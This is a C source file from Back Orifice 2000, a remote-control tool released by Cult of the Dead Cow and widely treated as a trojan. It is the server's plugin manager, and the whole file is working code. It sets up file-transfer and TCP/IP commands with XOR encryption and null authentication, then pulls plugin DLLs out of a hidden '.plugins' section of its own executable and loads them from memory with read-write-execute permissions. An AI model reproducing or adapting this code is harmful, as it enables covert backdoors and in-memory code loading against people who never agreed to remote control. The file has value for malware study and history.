/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<winnt.h>
#include<bocomreg.h>
#include<iohandler.h>
#include<encryption.h>
#include<dll_load.h>
#include<commandloop.h>
#include<comm_native.h>
#include<plugins.h>
#include<cmd\cmd_tcpip.h>
#include<cmd\cmd_plugin.h>
#include<cmd\cmd_file.h>
#include<config.h>
#include<xorencrypt.h>
#include<deshash.h>
#include<io_simpleudp.h>
#include<io_simpletcp.h>
#include<nullauth.h>
#include<main.h>

// -------------------- Plugins placeholder segment ------------------

#pragma data_seg(".plugins")

BYTE buttocks[1024]="\0\0\0\0<<<.OOM>>>\0";

#pragma data_seg()

#pragma comment(linker,"/section:.plugins,r")


// --------------------- Plugin manager options ----------------------
char g_svBuiltInOptions[]="<**CFG**>Built-In\0"
                          "B:Load XOR Encryption=1\0"
//						  "B:Load DES Encryption=1\0"
						  "B:Load NULLAUTH Authentication=1\0"
						  "B:Load UDP IO Module=1\0"
						  "B:Load TCP IO Module=1\0";


// --------------------- Function implementations ---------------------

HMODULE *g_phmodPlugins=NULL;
int g_nPluginCount=0;

void InitializeCommands(void)
{
	// Register Native BO Commands
	RegisterNativeCommands();
	
	// Initialize Native BO Commands
	Cmd_Tcpip_Init();
	Cmd_Buttplugs_Init();
	Cmd_FileXfer_Init();
	
	// Initialize DLLLoad
	InitializeDLLLoad();

	// Create Global IO, Encryption, and Authentication Handlers
	g_pIOHandler=new CIOHandler();
	if(g_pIOHandler==NULL) return;
	g_pEncryptionHandler=new CEncryptionHandler();
	if(g_pEncryptionHandler==NULL) return;
	g_pAuthHandler=new CAuthHandler();
	if(g_pAuthHandler==NULL) return; 

	// Add built-in options
	if(GetCfgBool(g_svBuiltInOptions,"Load XOR Encryption"))
		g_pEncryptionHandler->Insert(GetXOREncryptionEngine());
//	if(GetCfgBool(g_svBuiltInOptions,"Load DES Hashing"))
	g_pEncryptionHandler->Insert(GetDESHashEngine());

	if(GetCfgBool(g_svBuiltInOptions,"Load UDP IO Module"))
		g_pIOHandler->Insert(GetSimpleUdpIOHandler());
	if(GetCfgBool(g_svBuiltInOptions,"Load TCP IO Module"))
		g_pIOHandler->Insert(GetSimpleTcpIOHandler());
	if(GetCfgBool(g_svBuiltInOptions,"Load NULLAUTH Authentication"))
		g_pAuthHandler->Insert(GetNullAuthHandler());

	// Load plugins	
	LoadPlugins();
}

void TerminateCommands(void)
{
	// Unload plugins
	UnloadPlugins();
	
	// Get rid of authentication handler
	int i;
	for(i=0;i<MAX_AUTH_HANDLERS;i++) {
		g_pAuthHandler->Remove(i);
	}
	delete g_pAuthHandler;
	
	// Uninstall encryption
	for(i=0;i<MAX_ENCRYPTION_ENGINES;i++) {
		g_pEncryptionHandler->Remove(i);
	}
	delete g_pEncryptionHandler;
	
	// Terminate IO System
	for(i=0;i<MAX_IO_HANDLERS;i++) {
		g_pIOHandler->Remove(i);
	}
	delete g_pIOHandler;

	// Remove DLLLoad
	KillDLLLoad();

	// Terminate native commands
	Cmd_FileXfer_Kill();
	Cmd_Buttplugs_Kill();
	Cmd_Tcpip_Kill();
}


void LoadPlugins(void)
{
	BYTE *pImage=(BYTE *)g_module;

	// Get PE Header
	PIMAGE_FILE_HEADER pfh;
	pfh=(PIMAGE_FILE_HEADER) PEFHDROFFSET(pImage);
	
	// Get Section Count
	int nSectionCount;
	nSectionCount=pfh->NumberOfSections;

	// Get Section Header
	PIMAGE_SECTION_HEADER psh;
    psh = (PIMAGE_SECTION_HEADER)SECHDROFFSET (pImage);
	
	// Find the ".plugins" segment
	int i;
	for(i=0;i<nSectionCount;i++) {
		if( (*((DWORD *)(psh->Name))==0x756C702E) &&
			(*(((DWORD *)(psh->Name))+1)==0x736E6967) ) {
			break;
		}
		psh++;
	}
	if(i==nSectionCount) return;

	// Get plugin header
	PATTACHMENT_HEADER pah;
	pah = (PATTACHMENT_HEADER)RVATOVA(pImage,psh->VirtualAddress);
	
	// Install each plugin
	BYTE *pPlugin;
	DWORD dwSize;
	int count;
	
	count=pah->nNumPlugins;
	g_nPluginCount=0;
	pPlugin=(((BYTE *)pah)+sizeof(ATTACHMENT_HEADER));
	for(i=0;i<count;i++) {
		// Get Plugin Size
		dwSize=*((DWORD *)pPlugin);
		pPlugin+=sizeof(DWORD);
		
		// Add plugin
		AddPlugin(pPlugin,dwSize);

		// Go to next plugin
		pPlugin+=dwSize;
	}
}


void UnloadPlugins(void)
{
	int i;

	if(g_phmodPlugins!=NULL) {
		for(i=0;i<g_nPluginCount;i++) {
			HMODULE hDLL;
			hDLL=*(g_phmodPlugins+i);
			TYPEOF_TerminatePlugin *TerminatePlugin=(TYPEOF_TerminatePlugin *)GetDLLProcAddress(hDLL,"TerminatePlugin");
			
			TerminatePlugin();
			FreeDLL(hDLL);
		}
		free(g_phmodPlugins);
		g_phmodPlugins=NULL;
		g_nPluginCount=0;
	}
}

int AddPlugin(void *pPlugin, int nSize)
{
	// Fill in plugin linkage to pass to installation function
	PLUGIN_LINKAGE pl;	
	pl.pEncryptionHandler=g_pEncryptionHandler;
	pl.pIOHandler=g_pIOHandler;
	pl.pAuthHandler=g_pAuthHandler;
	pl.pIssueAuthCommandRequest=IssueAuthCommandRequest;
	pl.pIssueAuthCommandReply=IssueAuthCommandReply;
	pl.pListenAuthSocket=ListenAuthSocket;
	pl.pConnectAuthSocket=ConnectAuthSocket;
	pl.pDispatchCommand=DispatchCommand;
	pl.pRegisterCommand=RegisterCommand;
	pl.pUnregisterCommand=UnregisterCommand;
	pl.pRegisterClientMenu=NULL;
	pl.pUnregisterClientMenu=NULL;
	pl.pInteractiveConnect=NULL;
	pl.pInteractiveListen=NULL;

	// Load Plugin DLL
	HMODULE hDLL;
	hDLL=LoadDLLFromImage(pPlugin,NULL,RWX_PERMISSIONS);
	if(hDLL!=NULL) {
		// Call plugin installation function
		TYPEOF_InstallPlugin *InstallPlugin=(TYPEOF_InstallPlugin *)GetDLLProcAddress(hDLL,"InstallPlugin");
		
		if(InstallPlugin(pl)) {
	
			// Increase size of plugin array
			void *pMem,*pDum;
			pMem=malloc(sizeof(HMODULE)*(g_nPluginCount+1));
			if(pMem!=NULL) {	
				memcpy(pMem,g_phmodPlugins,sizeof(HMODULE)*g_nPluginCount);
				pDum=g_phmodPlugins;
				g_phmodPlugins=(HMODULE *)pMem;
				if(pDum!=NULL) free(pDum);
						
				// Add plugin to plugin array
				g_phmodPlugins[g_nPluginCount]=hDLL;			
				g_nPluginCount++;
				return 0;
			}
		} 
		FreeDLL(hDLL);
	}
	return -1;
}

int DebugPlugin(char *svPluginFile)
{
	// Fill in plugin linkage to pass to installation function
	PLUGIN_LINKAGE pl;	
	pl.pEncryptionHandler=g_pEncryptionHandler;
	pl.pIOHandler=g_pIOHandler;
	pl.pAuthHandler=g_pAuthHandler;
	pl.pIssueAuthCommandRequest=IssueAuthCommandRequest;
	pl.pIssueAuthCommandReply=IssueAuthCommandReply;
	pl.pListenAuthSocket=ListenAuthSocket;
	pl.pConnectAuthSocket=ConnectAuthSocket;
	pl.pDispatchCommand=DispatchCommand;
	pl.pRegisterCommand=RegisterCommand;
	pl.pUnregisterCommand=UnregisterCommand;
	pl.pRegisterClientMenu=NULL;
	pl.pUnregisterClientMenu=NULL;
	pl.pInteractiveConnect=NULL;
	pl.pInteractiveListen=NULL;

	// Load Plugin DLL
	HMODULE hDLL;
	hDLL=LoadLibrary(svPluginFile);
	if(hDLL!=NULL) {
		// Call plugin installation function
		TYPEOF_InstallPlugin *InstallPlugin=(TYPEOF_InstallPlugin *)GetDLLProcAddress(hDLL,"InstallPlugin");
		
		if(InstallPlugin(pl)) {
	
			// Increase size of plugin array
			void *pMem,*pDum;
			pMem=malloc(sizeof(HMODULE)*(g_nPluginCount+1));
			if(pMem!=NULL) {	
				memcpy(pMem,g_phmodPlugins,sizeof(HMODULE)*g_nPluginCount);
				pDum=g_phmodPlugins;
				g_phmodPlugins=(HMODULE *)pMem;
				if(pDum!=NULL) free(pDum);
						
				// Add plugin to plugin array
				g_phmodPlugins[g_nPluginCount]=hDLL;			
				g_nPluginCount++;
				return 0;
			}
		} 
		FreeDLL(hDLL);
	}
	return -1;
}


int RemovePlugin(int nNum)
{
	if(nNum<0 || nNum>=g_nPluginCount) return -1;

	// Unload specified plugin
		
	HMODULE hDLL;
	hDLL=g_phmodPlugins[nNum];
	TYPEOF_TerminatePlugin *TerminatePlugin=(TYPEOF_TerminatePlugin *)GetDLLProcAddress(hDLL,"TerminatePlugin");
	
	TerminatePlugin();
	FreeDLL(hDLL);
	FreeLibrary(hDLL);	// For debugging plugins only

	// Remove from array

	void *pMem,*pDum;
	pMem=malloc(sizeof(HMODULE)*(g_nPluginCount-1));
	if(pMem==NULL) return -1;

	memcpy(pMem,g_phmodPlugins,sizeof(HMODULE)*nNum);
	memcpy((HMODULE *)pMem+nNum,g_phmodPlugins+(nNum+1),sizeof(HMODULE)*(g_nPluginCount-(nNum+1)));
	
	pDum=g_phmodPlugins;
	g_phmodPlugins=(HMODULE *)pMem;
	free(pDum);
	
	g_nPluginCount--;
		
	return 0;
}

HMODULE GetPlugin(int nNum)
{
	if(nNum<0 || nNum>=g_nPluginCount) return NULL;

	return g_phmodPlugins[nNum];
}



